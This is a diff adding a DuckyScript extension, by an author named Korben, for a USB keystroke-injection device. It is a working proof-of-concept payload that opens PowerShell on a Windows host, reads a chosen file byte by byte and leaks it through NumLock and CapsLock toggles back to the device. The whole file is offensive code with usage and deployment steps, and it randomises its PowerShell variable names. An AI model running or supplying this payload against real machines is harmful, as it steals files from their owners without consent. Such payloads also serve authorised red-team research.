@@ -1,0 +1,87 @@
+EXTENSION POLYMORPHIC_WINDOWS_HID_EXFIL
+    REM VERSION 1.0
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Helpers for Keystroke Reflection data exfiltration
+        This payload is a proof of concept for USB HID only Data Exfiltration
+    
+        TARGET:
+            Windows Host that supports powershell and SendKeys
+    
+        USAGE:
+            Uncomment the function call below to run this extension inline
+            or call RUN_EXFIL() anywhere in your payload after the extension
+    
+        DEPLOYMENT:
+            Plug Ducky into host, wait for the LED to turn (and stay) solid green.
+    END_REM
+
+    REM CONFIGURATION:
+    REM File on host machine to exfil using Keystroke Reflection attack
+    DEFINE #TARGET_FILE filename.txt
+
+    FUNCTION RUN_WINDOWS_EXFIL()
+        STAGE Setup
+            LED_OFF
+            DELAY 500
+            REM Launch Windows RUN dialog
+            GUI r
+            DELAY 50
+            REM Launch powershell
+            STRINGLN powershell
+            DELAY 250
+            REM Save HOSTs current lock state
+            SAVE_HOST_KEYBOARD_LOCK_STATE
+            REM Start Listening - Enable EXFIL mode, Enable EXFIL mode for Device LEDS
+            $_EXFIL_MODE_ENABLED = TRUE
+            $_EXFIL_LEDS_ENABLED = TRUE
+            
+            REM Generate random powershell variables
+            VAR $LABELB = $_RANDOM_LOWER_LETTER_KEYCODE
+            VAR $LABELA = $_RANDOM_UPPER_LETTER_KEYCODE
+            VAR $LABELO = $_RANDOM_LOWER_LETTER_KEYCODE
+            WHILE ($LABELB == $LABELO)
+                $LABELO = $_RANDOM_LOWER_LETTER_KEYCODE
+            END_WHILE
+        END_STAGE 
+
+        STAGE Inject
+            REM Convert and reflect target file
+            STRING foreach(
+            INJECT_VAR $LABELB
+            STRING in $(Get-Content "#TARGET_FILE" -Encoding byte)){ foreach(
+            INJECT_VAR $LABELA
+            STRING in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){If(
+            INJECT_VAR $LABELB
+            STRING -band 
+            INJECT_VAR $LABELA
+            STRING ){
+            INJECT_VAR $LABELO
+            STRING +="%{NUMLOCK}"}Else{
+            INJECT_VAR $LABELO
+            STRING +="%{CAPSLOCK}"}}};
+            INJECT_VAR $LABELO
+            STRING +="%{SCROLLLOCK}";
+            STRING Add-Type -Assembly System.Windows.Forms;
+            STRING [System.Windows.Forms.SendKeys]::SendWait("
+            INJECT_VAR $LABELO
+            STRING ");exit;
+            ENTER
+        END_STAGE
+
+        STAGE Cleanup
+            REM Listen for EOF
+            WAIT_FOR_SCROLL_CHANGE
+            REM Indicate SUCCESS on Device LED, Disable EXFIL mode
+            LED_G
+            $_EXFIL_MODE_ENABLED = FALSE
+            REM Restore HOSTs lock state to original
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_STAGE 
+    END_FUNCTION
+    
+    REM Uncomment the function call below to run this extension inline (here)
+    REM or call RUN_WINDOWS_EXFIL() anywhere in your payload after the extension
+    REM RUN_WINDOWS_EXFIL()
+END_EXTENSION
